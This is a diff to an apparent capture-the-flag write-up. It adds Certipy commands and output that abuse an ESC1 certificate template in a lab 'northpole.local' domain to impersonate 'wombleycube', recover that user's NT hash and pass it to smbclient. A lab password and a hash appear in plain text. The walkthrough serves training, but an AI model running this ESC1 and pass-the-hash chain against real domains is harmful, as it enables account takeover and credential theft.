@@ -312,6 +312,40 @@ Certificate Templates
       ESC1                              : 'NORTHPOLE.LOCAL\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication
 
 ```
+
+#### Request Certificate for wombleycube using Certipy
+```bash
+alabaster@ssh-server-vm:~/impacket$ certipy req -dc-ip 10.0.0.53 -u elfy@northpole.local -p 'J4`ufC49/J4766' -ca northpole-npdc01-CA -target npdc01.northpole.local -template NorthPoleUsers -upn wombleycube@northpole.local -dns npdc01.northpole.local  
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Successfully requested certificate
+[*] Request ID is 43
+[*] Got certificate with multiple identifications
+    UPN: 'wombleycube@northpole.local'
+    DNS Host Name: 'npdc01.northpole.local'
+[*] Certificate has no object SID
+[*] Saved certificate and private key to 'wombleycube_npdc01.pfx'
+```
+
+#### Get NTLM hash of wombleycube
+```bash
+alabaster@ssh-server-vm:~/impacket$ certipy auth -pfx wombleycube_npdc01.pfx -dc-ip 10.0.0.53
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Found multiple identifications in certificate
+[*] Please select one:
+    [0] UPN: 'wombleycube@northpole.local'
+    [1] DNS Host Name: 'npdc01.northpole.local'
+> 0
+[*] Using principal: wombleycube@northpole.local
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saved credential cache to 'wombleycube.ccache'
+[*] Trying to retrieve NT hash for 'wombleycube'
+[*] Got hash for 'wombleycube@northpole.local': aad3b435b51404eeaad3b435b51404ee:5740373231597863662f6d50484d3e23
+```
+
 #### Access SMB Shares with the NTLM Hash of wombleycube
 ```bash
 alabaster@ssh-server-vm:~/impacket$ smbclient.py northpole.local/wombleycube@10.0.0.53 -hashes aad3b435b51404eeaad3b435b51404ee:5740373231597863662f6d50484d3e23 -dc-ip 10.0.0.53 
